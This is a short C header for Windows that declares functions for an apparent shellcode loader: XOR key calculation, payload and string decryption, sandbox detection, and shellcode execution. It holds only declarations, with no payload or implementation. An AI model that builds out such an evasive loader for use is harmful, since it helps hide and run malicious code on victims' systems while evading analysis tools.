#pragma once
#include <corecrt.h>

unsigned char calculate_xor_key();
unsigned char* load_shellcode(size_t *len);
void xor_decrypt(unsigned char *data, size_t len, unsigned char key);
void decrypt_xor_string(unsigned char *str, unsigned char key);
int detect_sandbox();
int execute_shellcode();